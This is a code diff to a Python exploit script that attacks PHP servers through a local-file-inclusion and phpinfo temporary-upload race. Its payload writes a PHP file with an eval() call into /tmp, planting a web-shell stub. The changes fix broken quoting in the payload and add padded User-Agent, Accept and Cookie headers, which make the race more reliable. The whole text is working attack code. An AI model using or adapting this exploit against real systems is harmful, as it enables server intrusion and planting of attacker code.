@@ -30,10 +30,10 @@ def setup(host, port):
     TAG="Security Test"
     PAYLOAD="""%s
 <?php
-$c=fopen("/tmp/g.php",';w';);
-fwrite($c,"<?php eval(';fb';);?>");
+$c=fopen("/tmp/g.php",'w');
+fwrite($c,"<?php eval('fb');?>");
 ?>\r""" % TAG
-    padding = "A" * 2000
+    padding = "A" * 4000
     LFIREQ = """GET /lfi.php?load=%(file)s HTTP/1.1\r
 User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36\r
 Connection: keep-alive\r
@@ -55,8 +55,9 @@ Submit
 ------WebKitFormBoundaryIYu6Un7AVVkBR0k6--\r""" % PAYLOAD
     REQ = """POST /phpinfo.php HTTP/1.1\r
 User-Agent: """ + padding + """\r
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"""+padding+"""\r
 Accept-Language: """ + padding + """\r
+Cookie: """+padding+"""\r
 Accept-Encoding: deflate\r
 Cache-Control: max-age=0\r
 Referer: """ + padding + """\r
@@ -97,6 +98,7 @@ def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
 
     s2.send(lfireq % {'file': fn, 'host': host})
     d = s2.recv(4096)
+    # print d
     s.close()
     s2.close()
     # print d
